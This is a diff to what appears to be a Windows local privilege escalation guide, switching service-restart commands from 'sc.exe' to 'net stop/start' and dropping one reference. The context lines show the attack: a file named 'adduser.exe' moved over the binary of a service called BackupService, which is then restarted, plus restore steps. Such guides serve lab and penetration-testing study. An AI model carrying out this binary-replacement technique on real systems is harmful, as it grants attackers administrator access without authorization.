@@ -84,17 +84,17 @@ move .\adduser.exe C:\backups\backupsvc.exe
 #### Step 5: Restart the Service
 1. **Stop the Service**:
    ```powershell
-   sc.exe stop <service_name>
+   net stop <service_name>
    ```
 2. **Start the Service**:
    ```powershell
-   sc.exe start <service_name>
+   net start <service_name>
    ```
 
 Example:
 ```powershell
-sc.exe stop BackupService
-sc.exe start BackupService
+net stop BackupService
+net start BackupService
 ```
 
 If the service cannot be restarted manually due to insufficient permissions:
@@ -168,16 +168,16 @@ To restore the original state of the service:
    ```
 3. Restart the service:
    ```powershell
-   sc.exe stop <service_name>
-   sc.exe start <service_name>
+   net stop <service_name>
+   net start <service_name>
    ```
 
 Example:
 ```powershell
 del C:\backups\backupsvc.exe
 move backupsvc.exe.bak C:\backups\backupsvc.exe
-sc.exe stop BackupService
-sc.exe start BackupService
+net stop BackupService
+net start BackupService
 ```
 
 ---
@@ -191,7 +191,6 @@ sc.exe start BackupService
 
 ### References
 - [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
-- Microsoft Documentation on `icacls` and `sc.exe`
 
 ---
 
